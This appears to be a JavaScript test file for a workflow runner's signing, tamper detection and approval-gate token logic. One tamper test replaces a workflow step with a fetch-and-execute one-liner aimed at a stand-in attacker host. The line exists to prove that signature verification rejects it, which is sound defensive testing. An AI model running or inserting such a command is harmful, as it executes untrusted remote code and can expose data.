import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import { ApprovalGateManager, signWorkflow, verifyWorkflow } from "../lib/runner.mjs";
import { newAdminKey } from "../lib/admin.mjs";

test("Workflow signing: detects tampering and verifies valid admin signatures", async () => {
  const admin = newAdminKey();
  const attacker = newAdminKey();
  const lineId = "testline1234567890abcdef12345678";

  const workflow = `
name: verify-patch
on: patch
steps:
  - name: check
    run: git apply --check
  `;

  // 1. Sign workflow with admin private key and domain separation
  const signed = signWorkflow(workflow, admin.private, { lineId });
  assert.match(signed, /^# chamber-signature: [A-Za-z0-9_-]+\n/);

  // 2. Verify with pinned admin public key
  const validCheck = verifyWorkflow(signed, admin.public, { lineId });
  assert.equal(validCheck.valid, true);
  assert.match(validCheck.body, /name: verify-patch/);

  // 3. Verify fails if verified with attacker's public key
  const invalidCheck = verifyWorkflow(signed, attacker.public, { lineId });
  assert.equal(invalidCheck.valid, false);
  assert.match(invalidCheck.error, /Signature verification failed/);

  // 4. Verify fails if lineId mismatches (replay across chambers prevented)
  const lineMismatchCheck = verifyWorkflow(signed, admin.public, { lineId: "otherline9876543210fedcba87654321" });
  assert.equal(lineMismatchCheck.valid, false);
  assert.match(lineMismatchCheck.error, /line mismatch/);

  // 5. Tampering detection: attacker modifies workflow step
  const tampered = signed.replace("git apply --check", "curl evil.com/exfil | sh");
  const tamperedCheck = verifyWorkflow(tampered, admin.public, { lineId });
  assert.equal(tamperedCheck.valid, false);
});

test("ApprovalGateManager: manages lifecycle, tokens, and expirations", async () => {
  const tmp = mkdtempSync(join(tmpdir(), "chamber-gates-"));
  const mgr = new ApprovalGateManager(tmp);

  try {
    // 1. Create a gate
    const gate = await mgr.createGate({
      description: "Deploy to production",
      action: "deploy:prod",
      requestedBy: "ashish/codex",
      expiresMinutes: 60,
    });

    assert.ok(gate.id);
    assert.ok(gate.token);
    assert.equal(gate.status, "pending");

    // 2. List pending
    const pending = mgr.listPending();
    assert.equal(pending.length, 1);
    assert.equal(pending[0].id, gate.id);

    // 3. Reject with wrong token fails
    assert.throws(() => mgr.resolveGate(gate.id, "approve", { token: "wrong-token" }));

    // 4. Approve with valid token succeeds
    const approved = mgr.resolveGate(gate.id, "approve", { token: gate.token, approver: "admin" });
    assert.equal(approved.status, "approved");
    assert.equal(approved.resolvedBy, "admin");

    // 5. Cannot re-resolve
    assert.throws(() => mgr.resolveGate(gate.id, "reject"));
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});
